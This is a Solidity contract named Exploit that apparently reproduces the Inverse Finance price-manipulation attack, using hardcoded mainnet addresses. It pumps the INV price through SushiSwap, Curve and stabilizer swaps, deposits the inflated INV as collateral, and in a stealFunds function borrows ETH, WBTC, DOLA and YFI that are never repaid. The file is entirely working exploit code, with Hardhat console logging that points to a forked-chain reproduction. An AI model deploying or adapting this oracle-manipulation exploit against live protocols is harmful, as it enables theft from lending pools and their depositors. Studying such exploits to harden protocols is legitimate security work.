// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
import "./interfaces/ICurve.sol";
import "./interfaces/ICompound.sol";
import "./interfaces/IUniswapV2Router.sol";
import "./interfaces/stabilizer.sol";

/*
AGENDA

Swap WETH for INV
Swap Weth for USDC
Swap USDC for DAI 
Swap DAI for DOLA

The exploiter actually swapped USDC for DOLA in a Curve Pool but I couldn't make it work
since it is in Vyper it is pretty hard to understand it.

Deposit all INV Tokens to Inverse Finance
Borrow tokens and don't repay them

TX-Hash of the swaps - 0x20a6dcff06a791a7f8be9f423053ce8caee3f9eecc31df32445fc98d4ccd8365

*/

contract Exploit {
    address public constant INV = 0x41D5D79431A913C4aE7d69a668ecdfE5fF9DFB68;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant sushiSwapRouter =
        0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant xINV = 0x1637e4e9941D55703a7A5E7807d6aDA3f7DCD61B;
    address public constant compTroller =
        0x4dCf7407AE5C07f8681e1659f626E114A7667339;
    address public constant anDOLA = 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670;
    address public constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant STABILIZER =
        0x7eC0D931AFFBa01b77711C2cD07c76B970795CDd;
    address public constant CurvePool =
        0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address public constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;

    function getWeth() external {
        (bool success, ) = WETH.call{value: 500 ether}(
            abi.encodeWithSignature("deposit()")
        );
        require(success);
        logs();
    }

    function swap(
        address router,
        address _token1,
        address _token2,
        uint _amount
    ) private {
        IERC20(_token1).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = _token1;
        path[1] = _token2;
        uint deadline = block.timestamp + 300;
        IUniswapV2Router(sushiSwapRouter).swapExactTokensForTokens(
            _amount,
            1,
            path,
            address(this),
            deadline
        );
    }

    function stabilizerSwap(uint _amount) private {
        IERC20(DAI).approve(STABILIZER, type(uint256).max);
        stabilizer(STABILIZER).buy(_amount);
    }

    function exploitINV() external {
        swap(sushiSwapRouter, WETH, INV, 300 ether);
        logs();
        swap(sushiSwapRouter, WETH, USDC, 200 ether);
        logs();
        curveSwap();
        logs();
        uint dai_balance = IERC20(DAI).balanceOf(address(this)) - 3000 ether;
        // For some reasaon when I input the whole balance it reverts. With error Insufficient DAI balance
        stabilizerSwap(dai_balance);
        logs();
        uint dola_balance = IERC20(DOLA).balanceOf(address(this));
        swap(sushiSwapRouter, DOLA, INV, dola_balance);
        logs();
        depositTokens();
        logs();
        stealFunds();
    }

    function depositTokens() private {
        require(
            IERC20(INV).approve(xINV, type(uint256).max),
            "Approve diddn't go through"
        );

        uint inv_balance = IERC20(INV).balanceOf(address(this));
        (bool success, ) = xINV.call(
            abi.encodeWithSignature("mint(uint256)", inv_balance)
        );
        require(success, "Inv Deposit Failed");
        logs();

        address[] memory approvedTokens = new address[](1);
        approvedTokens[0] = xINV;

        (bool success2, ) = compTroller.call(
            abi.encodeWithSignature("enterMarkets(address[])", approvedTokens)
        );
        require(success2, "Entering markets failed");
        logs();
    }

    function stealFunds() private {
        borrowAsset(anETH, 1588 ether); // 1. Ether
        borrowAsset(anWBTC, 9000000000); // 2. WBTC
        borrowAsset(anDOLA, 1000000 ether); // 3. DOLA
        borrowAsset(anYear, 30 ether); // 4. Yearn Finance
    }

    address public constant anETH = 0x697b4acAa24430F254224eB794d2a85ba1Fa1FB8;
    address public constant anWBTC = 0x17786f3813E6bA35343211bd8Fe18EC4de14F28b;
    address public constant anYear = 0xde2af899040536884e062D3a334F2dD36F34b4a4;

    function borrowAsset(address _cTokenContract, uint _amount) internal {
        IERC20(_cTokenContract).approve(_cTokenContract, type(uint256).max);
        ICompound(_cTokenContract).borrow(_amount);
        logs();
    }

    function logs() internal view {
        console.log("WETH Balance: ", IERC20(WETH).balanceOf(address(this)));
        console.log("USDC Balance: ", IERC20(USDC).balanceOf(address(this)));
        console.log("DAI Balance: ", IERC20(DAI).balanceOf(address(this)));
        console.log("WBTC Balance: ", IERC20(WBTC).balanceOf(address(this)));
        console.log("DOLA Balance: ", IERC20(DOLA).balanceOf(address(this)));
        console.log("INV Balance: ", IERC20(INV).balanceOf(address(this)));
        console.log("xINV Balance: ", IERC20(xINV).balanceOf(address(this)));
        console.log("ETH balance: ", address(this).balance);
        console.log("INV Price WETH/INV: ", getInvPrice(WETH, INV));
        console.log("INV Price DOLA/INV: ", getInvPrice(DOLA, INV));
        console.log("----------------------------------------------------");
    }

    function getInvPrice(address _token1, address _token2)
        public
        view
        returns (uint256)
    {
        address[] memory path;
        path = new address[](2);
        path[0] = _token1;
        path[1] = _token2;
        uint256[] memory amountOutMins = IUniswapV2Router(sushiSwapRouter)
            .getAmountsOut(1 ether, path);
        return amountOutMins[path.length - 1];
    }

    function curveSwap() internal {
        require(
            IERC20(USDC).approve(CurvePool, type(uint256).max),
            "Approve failed CURVE"
        );
        uint256 bal = IERC20(USDC).balanceOf(address(this));
        ICurve(CurvePool).exchange(int128(1), int128(0), bal, uint256(0));
    }

    function finalNums() external view {
        console.log("ETH balance: ", address(this).balance);
        console.log("WBTC Balance: ", IERC20(WBTC).balanceOf(address(this)));
        console.log("DOLA Balance: ", IERC20(DOLA).balanceOf(address(this)));
    }

    receive() external payable {}
}
